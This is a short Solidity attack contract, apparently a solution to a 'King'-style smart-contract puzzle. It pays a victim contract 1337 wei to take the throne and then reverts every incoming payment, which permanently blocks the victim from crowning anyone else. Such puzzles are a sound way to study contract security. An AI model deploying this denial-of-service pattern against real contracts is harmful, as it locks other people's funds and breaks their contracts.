// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address _victim) payable {
        _victim.call{value: 1337 wei}("");
    }

    receive() external payable {
        revert("Still The King");
    }
}
